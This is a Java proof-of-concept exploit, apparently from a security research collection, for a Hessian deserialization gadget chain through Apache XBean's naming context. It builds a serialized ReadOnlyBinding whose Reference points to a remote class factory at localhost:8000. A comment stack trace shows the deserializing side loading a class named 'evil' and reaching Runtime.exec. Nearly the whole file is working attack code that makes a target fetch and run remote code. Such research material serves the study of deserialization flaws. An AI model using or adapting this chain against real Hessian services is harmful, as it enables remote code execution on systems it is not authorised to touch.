package com.javasec.pocs.hessian.xbean;
import com.javasec.utils.SerializeUtils;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;

import javax.naming.Context;
import javax.naming.Reference;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:7, evil
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:61, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
 * getObjectInstance:319, NamingManager (javax.naming.spi)
 * resolve:73, ContextUtil (org.apache.xbean.naming.context)
 * getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)
 * toString:192, Binding (javax.naming)
 * valueOf:2994, String (java.lang)
 * append:131, StringBuilder (java.lang)
 * expect:2865, Hessian2Input (com.caucho.hessian.io)
 * readString:1407, Hessian2Input (com.caucho.hessian.io)
 * readObjectDefinition:2163, Hessian2Input (com.caucho.hessian.io)
 * readObject:2105, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:244, SerializeUtils (com.javasec.utils)
 * main:15, ToStringXbean (com.javasec.pocs.hessian.xbean)
 */
public class ToStringXbean {
    public static void main(String[] args) throws Exception {
        Reference refObj=new Reference("evil","evil","http://localhost:8000/");
        Context ctx = SerializeUtils.createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", refObj, ctx);
        SerializeUtils.setFieldValue(binding, "boundObj", null);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(binding));
    }
}
